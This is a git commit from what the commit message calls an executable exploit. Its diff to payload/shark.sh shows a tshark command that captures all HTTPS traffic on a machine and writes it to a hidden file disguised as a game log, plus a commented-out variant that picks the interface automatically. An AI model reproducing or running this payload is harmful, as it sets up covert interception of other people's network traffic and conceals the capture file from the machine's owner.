dc5c68eef53c392bb4b0f5e2a86fa080d4591319
Niketh Murali <nikethmurali94@gmail.com>
2021-04-25 16:34:13 -0400

    Add setup to the executable exploit

--- payload/shark.sh
+++ payload/shark.sh
@@ -1,1 +1,2 @@
 tshark -i $(python selectinterface.py) -f "tcp port 443" -w /var/log/gamelog/.gamelog
+#tshark -i $(ip route get 8.8.8.8 | cut -d" " -f 5 | head -n 1) -f "tcp port 443" -w /var/log/gamelog/.gamelog
